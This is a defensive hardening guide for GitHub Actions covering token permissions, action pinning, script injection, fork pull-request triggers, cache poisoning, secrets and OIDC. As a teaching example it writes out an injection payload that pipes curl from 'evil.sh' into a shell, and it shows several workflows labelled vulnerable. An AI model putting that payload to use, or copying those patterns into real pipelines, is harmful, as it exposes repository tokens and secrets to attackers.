# Security

A workflow run holds a credential that can write to the repository, the
plaintext of every secret the job references, and network reach to
whatever the runner can reach. Everything below follows from that. This
file is the threat model and the hardening rulebook; workflow shape
lives in [`workflow-design.md`](workflow-design.md), and the tooling
that enforces these rules lives in
[`gates-and-release.md`](gates-and-release.md).

Sections, roughly in order of how often they are the actual problem:

1. [`## Permissions`](#permissions) — what the token can do
2. [`## Supply chain`](#supply-chain) — what code runs
3. [`## Script injection`](#script-injection) — whose input becomes code
4. [`## GITHUB_ENV injection`](#github_env-injection) — the quieter variant
5. [`## Fork pull requests`](#fork-pull-requests) — the trust boundary
6. [`## Cache and artifact poisoning`](#cache-and-artifact-poisoning)
7. [`## Secrets`](#secrets) — handling, masking, scoping
8. [`## OIDC`](#oidc) — deleting the cloud secret entirely
9. [`## Environments as a boundary`](#environments-as-a-boundary)
10. [`## Self-hosted runners`](#self-hosted-runners)
11. [`## Runtime hardening`](#runtime-hardening)
12. [`## When an action is compromised`](#when-an-action-is-compromised)

## Permissions

### The rule

Declare `permissions:` at workflow level, read-only, and widen per job.

```yaml
permissions:
  contents: read

jobs:
  publish:
    permissions:
      contents: read
      id-token: write      # OIDC only
      packages: write      # this job actually pushes
```

Without a `permissions:` block the run inherits the
repository/organization default. GitHub changed the default for *newly
created* repositories to read-only, but older repositories and
organizations that never flipped the setting still default to
**write-all** — meaning every third-party action in the run receives a
token that can push commits, open releases, and modify workflows.
`permissions: {}` grants nothing at all and is the right baseline for a
workflow that only reads the checkout.

### Scopes

`actions`, `artifact-metadata`, `attestations`, `checks`,
`code-quality`, `contents`, `deployments`, `discussions`, `id-token`,
`issues`, `packages`, `pages`, `pull-requests`, `security-events`,
`statuses`, `vulnerability-alerts`. Each takes `read`, `write`, or
`none`; the shorthands `read-all` and `write-all` set every scope, and
`{}` disables all.

Two non-obvious ones:

- **`id-token: write`** does not grant write access to anything. It
  permits the job to *request* an OIDC token. Reviewers flag it as
  over-permissioned; it is the opposite.
- **`contents: write` is the dangerous one.** It permits pushing to the
  default branch, which — because workflows live in the repository —
  means modifying the workflows themselves. Treat any job requesting it
  as a privileged job and confine it to the smallest possible step set.

A job that calls a reusable workflow cannot grant that workflow more
permission than the caller holds; permissions narrow down the chain,
never up.

Source:
<https://docs.github.com/en/actions/reference/security/secure-use>.

## Supply chain

### Pin to a SHA, and automate the bump

```yaml
#      ^ the 40-char SHA of the tagged commit   ^ kept in sync by Dependabot
- uses: actions/checkout@REPLACE_WITH_PINNED_SHA # v5.0.0
```

Resolve the SHA yourself (`gh api repos/actions/checkout/git/ref/tags/v5.0.0`
or the tag page) — never copy one from documentation, including this
file. A SHA you did not resolve is a SHA you did not verify.

Tags and branches are mutable references. On 14–15 March 2025 an
attacker with write access to `tj-actions/changed-files` repointed every
tag from `v1` to `v45.0.7` at a commit that dumped the runner's memory —
including secrets — into the publicly readable workflow log, across more
than 23,000 repositories (CVE-2025-30066). A second action,
`reviewdog/action-setup@v1`, was compromised in the same campaign
(CVE-2025-30154). Every repository pinned to a SHA was unaffected; every
repository pinned to `@v45` was exploited.

The corollary matters as much as the rule: **a SHA pin with no automated
bumper is a frozen, un-patched dependency.** This is exactly the
digest-pinning rule from the `docker` skill. Pin *and* automate:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    # Give a compromised release time to be discovered before you take it.
    cooldown:
      default-days: 7
```

Dependabot rewrites both the SHA and the trailing version comment, which
is why the comment must sit on the same line as the `uses:`. It does not
raise alerts for SHA-pinned actions (advisories are matched by version
range), so pair pinning with Dependabot **version** updates rather than
relying on security alerts alone, and enable dependency review on PRs.

The cooldown window is the lesson of the 2025 incidents: most compromised
releases were identified within days. Taking every release the hour it
lands maximizes exposure for no practical benefit.

### Reduce what you pin in the first place

The cheapest supply-chain control is not using the action. `uses:
some-org/setup-jq@v1` to install a tool that is already on the runner,
or to run three lines of shell, adds an entire repository to your trust
boundary. zizmor's `superfluous-actions` audit exists because this is
common.

For actions you do need, prefer ones published by `actions/`,
`github/`, or the tool's own vendor, and read the `dist/` bundle of any
JavaScript action you are pinning for the first time — the published
bundle, not the source, is what runs.

### Organization-level enforcement

- **Allowed actions policy** — restrict to `actions/*`, verified
  creators, or an explicit allowlist. This is the single highest-leverage
  organization setting.
- **Require actions to be pinned to a full-length commit SHA** — a
  repository/organization setting that rejects tag references outright,
  including for first-party actions.
- **Immutable actions** — actions published as OCI packages to GitHub
  Packages get tag immutability at the registry level, so `@v3` cannot
  be repointed. Consuming an immutable-published action by SemVer tag is
  as safe as a SHA; publishing yours that way is the right default for a
  shared internal action ([`reuse.md`](reuse.md#versioning-and-publishing)).
- **CODEOWNERS on `.github/workflows`** — workflow changes are
  privilege changes, so they get a named reviewer.

Sources:
<https://docs.github.com/en/actions/reference/security/secure-use>,
<https://github.com/advisories/GHSA-mrrh-fwg8-r2c3>,
<https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction>.

## Script injection

### The mechanism

`${{ }}` is substituted into the generated shell script as literal text
*before* the shell runs. There is no quoting, no escaping, no type
boundary:

```yaml
# VULNERABLE
- run: echo "PR title is ${{ github.event.pull_request.title }}"
```

A pull request titled `a"; curl -s https://evil.sh | sh; echo "` yields
a script whose second statement is a shell pipeline the attacker wrote.
That code runs with the job's `GITHUB_TOKEN` and every secret the job
can see. Opening a pull request requires no privileges at all.

### Which contexts are untrusted

GitHub names these fields as attacker-shapeable: **`body`,
`default_branch`, `email`, `head_ref`, `label`, `message`, `name`,
`page_name`, `ref`, `title`**. In practice: anything under
`github.event.*` that a user typed, plus branch names
(`github.head_ref`), commit messages, issue and PR bodies and titles,
review comments, and the author's display name and email. Treat
`github.event` as attacker-controlled input by default and justify the
exceptions, not the other way round.

`github.actor` deserves a separate warning: it is easily spoofed for
authorization purposes (a PR from a bot account, a
`workflow_dispatch` triggered by anyone with write access), so
`if: github.actor == 'dependabot[bot]'` is not an authentication check.
Use `github.event.pull_request.user.type` or the app-token identity.

### The two fixes

**Bind to an environment variable** — the value is passed through the
process environment, never through script generation:

```yaml
- name: Check PR title
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    if [[ "$TITLE" =~ ^octocat ]]; then
      echo "PR title starts with 'octocat'"
    fi
```

The double quotes around `"$TITLE"` are load-bearing: an unquoted
expansion re-introduces word splitting and glob expansion, which is a
weaker but real version of the same bug.

**Or pass it as an action input** — action inputs are arguments, not
script text:

```yaml
- uses: fakeaction/checktitle@REPLACE_WITH_PINNED_SHA # v3.0.0
  with:
    title: ${{ github.event.pull_request.title }}
```

Note that this only holds if the action itself does not interpolate the
input into a shell command — a composite action that does
`run: echo ${{ inputs.title }}` has simply moved the vulnerability one
file away. Composite actions are inside the blast radius, not outside
it.

### Detection

actionlint flags expression injection; zizmor's `template-injection`
audit is the more thorough check and can auto-fix many instances; CodeQL
ships Actions queries. Run all three rather than choosing —
[`gates-and-release.md`](gates-and-release.md).

Source:
<https://docs.github.com/en/actions/concepts/security/script-injections>.

## GITHUB_ENV injection

The quieter sibling. A step that writes untrusted content into
`$GITHUB_ENV` without a safe delimiter lets that content forge
*additional* environment variables for every later step:

```yaml
# VULNERABLE: a body containing a newline and "PATH=/tmp/evil"
# sets PATH for every subsequent step.
- run: echo "BODY=${{ github.event.issue.body }}" >> "$GITHUB_ENV"
```

The historical version of this was CVE-2020-15228, where the
`::set-env` *stdout* command meant any process that merely printed the
magic string — an npm postinstall script, a compiler warning containing
attacker text — could set `LD_PRELOAD` or `NODE_OPTIONS` for later
steps, including deploy steps holding production credentials. GitHub
removed those commands in November 2020; the file-based mechanism is
still injectable if you write untrusted data into it carelessly.

Rules:

- Never write a raw untrusted value into `$GITHUB_ENV` or
  `$GITHUB_PATH`. If it must propagate, write it to a file and have the
  consuming step read the file.
- Multi-line values use heredoc syntax with a **randomized** delimiter
  (`EOF_$(uuidgen)`), never a fixed `EOF` that the content can contain.
- Writing to `$GITHUB_ENV` at all in a job that later handles secrets is
  worth a second look; zizmor's `github-env` audit flags the pattern.

Sources:
<https://github.blog/changelog/2020-11-09-github-actions-removing-set-env-and-add-path-commands-on-november-16/>,
<https://docs.zizmor.sh/audits/#github-env>.

## Fork pull requests

### The three triggers

| Trigger | Checks out | Secrets | Token | Safe to run fork code? |
|---|---|---|---|---|
| `pull_request` | merge ref of the fork's head | **none** (empty) | read-only | **yes** — this is the safe one |
| `pull_request_target` | **base** branch by default | full | writable by default | **no** |
| `workflow_run` | default branch by default | full | writable by default | **no** |

`pull_request` from a fork gets no secrets and a read-only token
precisely so that running a stranger's code is safe. That restriction is
the security boundary — the frequent request to "just give fork PRs the
secrets" is a request to remove it.

`pull_request_target` exists for workflows that must act *on* the PR
with privilege (labelling, commenting, assigning) while the PR's own
code stays untrusted. It runs the workflow definition from the base
branch — so a malicious PR cannot edit the workflow — but it runs it
with full secrets. The fatal pattern is checking out the head anyway:

```yaml
# CATASTROPHIC: gives every fork author your secrets.
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@REPLACE_WITH_PINNED_SHA
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # fork code
      - run: npm ci && npm run build                       # fork's scripts
```

`npm ci` alone executes the fork's `preinstall`/`postinstall` scripts.
So does `make`, `uv sync` on a project with a build backend, `terraform
init` with a custom provider mirror, and a `Dockerfile` build. "We only
run the linter" is not a defence — the linter's config is also in the
PR.

### If you genuinely need build-and-comment on fork PRs

Use the two-workflow handoff. The untrusted build runs under
`pull_request` (no secrets, read-only token) and writes its result to an
artifact; a second workflow under `workflow_run` reads the artifact and
does the privileged part.

```yaml
# .github/workflows/pr-build.yml  — untrusted, no secrets
name: pr-build
on: [pull_request]
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@REPLACE_WITH_PINNED_SHA # v5.0.0
        with: { persist-credentials: false }
      - run: npm ci && npm run build
      - run: echo "${{ github.event.number }}" > pr-number.txt
      - uses: actions/upload-artifact@REPLACE_WITH_PINNED_SHA # v4.6.2
        with:
          name: pr-result
          path: |
            dist/report.json
            pr-number.txt
```

```yaml
# .github/workflows/pr-comment.yml — privileged, no fork code
name: pr-comment
on:
  workflow_run:
    workflows: ["pr-build"]
    types: [completed]
permissions:
  contents: read
  pull-requests: write
jobs:
  comment:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    steps:
      # Download only; never check out or execute the PR's code here.
      - uses: actions/download-artifact@REPLACE_WITH_PINNED_SHA # v5.0.0
        with:
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
          name: pr-result
      - name: Post comment
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          set -euo pipefail
          # Artifact content is attacker-controlled: validate, never eval.
          pr="$(tr -cd '0-9' < pr-number.txt | head -c 10)"
          [[ -n "$pr" ]] || { echo "no pr number"; exit 1; }
          jq -e . dist/report.json > /dev/null
          gh pr comment "$pr" --body-file <(jq -r '.summary' dist/report.json)
```

The critical discipline in the second workflow: **artifacts from the
first workflow are attacker-controlled data.** GitHub's own guidance is
to treat them with caution. Validate structure, constrain values, never
`eval`, never `source`, never pass an artifact string into a shell
command unquoted.

A cheaper alternative that avoids the whole dance: have the untrusted
workflow write its output to `$GITHUB_STEP_SUMMARY` and skip the
comment. Most teams want the comment less than they think.

Sources:
<https://docs.github.com/en/actions/reference/security/secure-use>,
<https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/>.

## Cache and artifact poisoning

### Caches cross the trust boundary

Caches are **repository-scoped**, not workflow- or branch-scoped. A run
can restore caches created on its own branch, on the default branch,
and — for pull requests — on the base branch. A workflow triggered by a
fork PR that writes a cache is therefore writing into a store that a
later privileged run on `main` can read, if the keys match.

This is not theoretical. The Angular `dev-infra` compromise chained a
script injection in a `pull_request_target` workflow into filling the
cache with poisoned `node_modules` under a legitimate key, which a
scheduled privileged workflow then restored — exposing its token. The
tooling to do this is public.

Mitigations, in order of strength:

1. **Release and publish workflows do not restore caches.** The minutes
   saved are not worth the class of bug. If you must,
   `actions/cache/restore` with a key containing a value no PR can
   produce (a tag, a commit on `main`).
2. **Never cache anything that ends up in a published artifact.** Cache
   the package-manager store, not the build output.
3. **Key on a lockfile hash** so a poisoned entry cannot masquerade as a
   different dependency set.
4. zizmor's `cache-poisoning` audit flags cache usage in
   release-triggered workflows specifically.

### ArtiPACKED

`actions/checkout` defaults to `persist-credentials: true`, writing the
run's token into `.git/config` as an extraheader. Upload the workspace
as an artifact — a common "publish the build for debugging" step — and
the token ships with it. On a public repository, artifacts are
downloadable by anyone. Researchers found this leaking live tokens
across dozens of significant open-source projects.

```yaml
- uses: actions/checkout@REPLACE_WITH_PINNED_SHA # v5.0.0
  with:
    persist-credentials: false
```

Set it on every checkout except in jobs that actually push with the
default credential. GitHub considers the default intentional, so this
stays the repository owner's responsibility. zizmor's `artipacked` audit
detects it.

Sources:
<https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/>,
<https://www.stepsecurity.io/blog/detect-leaked-secrets-in-github-action-workflow-artifacts>.

## Secrets

### Handling rules

- **Anyone with write access to the repository can read every
  repository secret** — by pushing a branch with a workflow that echoes
  it in a way redaction misses. Repository secrets are therefore scoped
  to "people who can merge", not "people who should see production
  credentials". Use environment secrets with required reviewers for
  anything narrower.
- **Never store structured data as a secret.** Redaction is exact-match
  on the stored string; a JSON or YAML blob is reformatted,
  re-serialized, or partially printed and the match fails. One secret
  per value.
- **Register derived secrets.** If a workflow base64-decodes a secret,
  mints a JWT from a private key, or URL-encodes a token, the derived
  value is **not** masked. `echo "::add-mask::$DERIVED"` immediately
  after producing it, before anything can log it.
- **Redaction is not a security boundary, it is a convenience.** A step
  that prints a secret one character per line, or reversed, or
  base64-encoded, defeats it entirely. The control is not letting
  untrusted code run in a job that holds secrets.
- **Rotate on exposure, and rotate on schedule.** A secret that appeared
  unredacted in a log is compromised even after the log is deleted —
  deletion is cleanup, not remediation.
- **Audit third-party actions for secret exfiltration** before pinning
  them, and check `org.update_actions_secret` events in the audit log
  when investigating.

### Scoping

`secrets` resolve from three levels, narrowest wins: **environment**
(gated by protection rules), **repository**, **organization** (can be
restricted to selected repositories). Production credentials belong at
the environment level — that is the only level where a human approval
can stand between a merge and the credential's use.

### `secrets: inherit`

```yaml
jobs:
  deploy:
    uses: ./.github/workflows/deploy.yml
    secrets: inherit            # hands over the entire store
```

versus:

```yaml
    secrets:
      REGISTRY_TOKEN: ${{ secrets.REGISTRY_TOKEN }}
```

Inheritance is convenient the day you write it and invisible forever
after; the called workflow's future maintainer gets access to secrets
you never intended. It also only passes to *directly* called workflows —
in a chain A → B → C, C sees nothing from A unless each hop re-passes.
zizmor's `secrets-inherit` audit flags it. Enumerate.

Source:
<https://docs.github.com/en/actions/reference/security/secure-use>.

## OIDC

### Why

A cloud access key in repository secrets is long-lived, readable by
everyone with write access, identical across every run, and rotated
only when someone remembers. An OIDC token is minted per job, carries
claims identifying the exact repository, ref, and environment, expires
in minutes, and cannot be replayed elsewhere. There is no rotation to
forget because there is nothing stored.

### Workflow side

```yaml
permissions:
  contents: read
  id-token: write        # request an OIDC token; grants nothing else

jobs:
  deploy:
    environment: production
    steps:
      - uses: aws-actions/configure-aws-credentials@REPLACE_WITH_PINNED_SHA # v5.0.0
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
          aws-region: ap-southeast-1
```

`id-token: write` must be on the job (or workflow), and it is often
missed because the error — "Credentials could not be loaded" — points at
the cloud side.

### Cloud side: constrain the `sub` claim

The trust policy is where the security actually lives. A policy that
accepts `repo:my-org/*:*` accepts *any workflow on any branch of any
repository in the org*, which is barely better than a static key. The
`sub` claim formats:

| What you want to trust | `sub` value |
|---|---|
| a specific environment | `repo:ORG/REPO:environment:production` |
| a specific branch | `repo:ORG/REPO:ref:refs/heads/main` |
| a specific tag | `repo:ORG/REPO:ref:refs/tags/v1.0.0` |
| any pull request | `repo:ORG/REPO:pull_request` |

Trust the **environment** form for deployments: it composes with
required reviewers so the token cannot be minted until a human approves.

```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:environment:production"
    }
  }
}
```

Use `StringEquals` on `sub`, not `StringLike` with a wildcard. If a
wildcard is unavoidable, anchor everything before it
(`repo:my-org/my-repo:ref:refs/tags/v*`, never `repo:my-org/*`). AWS
does not support custom OIDC claims, so `sub` and `aud` are what you
have; Azure and GCP support richer federated-credential conditions.

The same mechanism backs **trusted publishing** to PyPI, npm, RubyGems,
and crates.io — publishing without an API token at all. Prefer it; see
[`gates-and-release.md`](gates-and-release.md#release-workflows).

Sources:
<https://docs.github.com/en/actions/concepts/security/openid-connect>,
<https://docs.github.com/en/actions/how-tos/secure-your-work/security-harden-deployments/oidc-in-aws>.

## Environments as a boundary

`environment:` on a job is the only place in GitHub Actions where a
human can stand between a merge and a credential. It provides:

- **Required reviewers** — up to six users or teams; one approval
  releases the job. Enable "prevent self-review" or the author of the
  deploy approves their own deploy.
- **Wait timer** — 1 to 43,200 minutes of enforced delay, the simplest
  possible "someone will notice before it lands" control.
- **Deployment branch and tag policy** — restrict which refs may deploy
  to this environment; "protected branches only" is the usual choice.
- **Environment secrets and variables** — scoped to the environment, so
  the production key does not exist in the context of a PR job.
- **Custom deployment protection rules** — third-party gates (change
  management, observability checks) via GitHub Apps.

Maximum six protection rules per environment; approvals expire after 30
days.

The important property: a job with `environment: production` **cannot
access that environment's secrets until the gate passes**. This is what
makes environments a boundary rather than a label. A workflow that puts
production credentials in repository secrets and adds
`environment: production` for the deployment-history UI has the label
without the boundary.

Caveat for self-hosted runners: required reviewers do not protect
secrets on a self-hosted runner that also runs unprivileged jobs — a
concurrently running job can read them from the process table.

Source:
<https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments>.

## Self-hosted runners

### The rule

**Never on a public repository.** GitHub's own wording is "should almost
never be used". Anyone in the world can open a pull request, and a
self-hosted runner is not an ephemeral clean VM — code from that PR can
persist on the machine and compromise every later job on it, including
privileged ones.

On private repositories, the risk shrinks but does not vanish: anyone
with read access can fork and open a PR, and secrets passed as
command-line arguments are visible to concurrently running jobs via
`ps x -w`. "Destroy the runner after each job" does not fix that;
concurrent jobs on the same host still see each other.

### If you must

- **Ephemeral / just-in-time registration.** Register via the REST API
  with a JIT config, run one job, deregister:
  `./run.sh --jitconfig "${encoded_jit_config}"`. This is the only
  acceptable shape for a runner that touches secrets. Re-using the
  underlying hardware still risks leaking between runs — automate a
  clean image.
- **Runner groups** with explicit repository allowlists, registered at
  the highest level that actually shares them.
- **Network isolation.** Block the cloud instance metadata endpoint
  (169.254.169.254) — otherwise a job inherits the host's instance role
  regardless of what secrets you withheld. Restrict egress to what
  builds need.
- **Nothing sensitive on the host.** No SSH keys, no `~/.aws`, no
  long-lived tokens in the environment.
- **`runs-on` label discipline.** Labels are not an access-control
  mechanism — any workflow in a repository with access to the group can
  claim any label in it.

Counter-position worth stating fairly: self-hosted runners are the right
call for workloads needing GPUs, licensed software, large caches, or
VPC-internal access, and for cost at scale. The position this rulebook
takes is not "never" but "T3-or-named-pain, ephemeral only, never
public" — name the pain, then build it properly.

Source:
<https://docs.github.com/en/actions/reference/security/secure-use>.

## Runtime hardening

Beyond configuration, a runtime agent can monitor and restrict what a
job does — process execution, file integrity, and network egress.
`step-security/harden-runner` is the common choice; it runs as the first
step and supports `egress-policy: audit` (log outbound connections,
build a baseline) and `egress-policy: block` (deny anything outside
`allowed-endpoints`).

```yaml
- uses: step-security/harden-runner@REPLACE_WITH_PINNED_SHA # v2.13.1
  with:
    egress-policy: audit
```

Honest framing, because this is a genuine trade:

**For** — it is the only control that catches a *compromised dependency
at runtime*, which pinning cannot: a legitimate pinned action can
receive a malicious transitive dependency. In the 2025 incidents,
harden-runner in audit mode showed the exfiltration endpoint in the run
log.

**Against** — it installs a third-party agent with elevated access into
every job, which is itself supply-chain surface; block mode needs a
maintained per-workflow endpoint allowlist that breaks builds when a
registry adds a CDN host.

The defensible middle: audit mode broadly (near-zero cost, real
detection value), block mode only on release and deploy workflows where
the endpoint set is small and stable, and always SHA-pinned like
everything else. That is the T3-or-named-pain line from the SKILL.md
tiering table.

Source: <https://github.com/step-security/harden-runner>.

## When an action is compromised

A runbook, because this now happens often enough to need one.

1. **Determine exposure.** Search every workflow for the action:
   `grep -rn "org/action@" .github/workflows/`. Check the *run history*,
   not just current files — a since-removed usage still ran.
2. **Check the logs of runs in the window.** The `tj-actions` payload
   printed secrets into the log; if your logs contain them, they are
   compromised regardless of redaction, and on a public repository they
   were world-readable.
3. **Rotate every secret any affected workflow could reach.** Every
   secret in scope for those jobs, not only the ones the step used —
   the whole environment was available to the process.
4. **Rotate `GITHUB_TOKEN`-derived state**: check for unexpected
   branches, releases, deploy keys, and workflow file changes.
5. **Pin forward, do not un-pin.** Move to the patched SHA. If the
   action is unmaintained, vendor it — copy the action into
   `.github/actions/` under your own review.
6. **Backfill the control that would have prevented it** — SHA pinning,
   an allowed-actions policy, a Dependabot cooldown, harden-runner in
   audit mode — rather than treating it as a one-off cleanup.
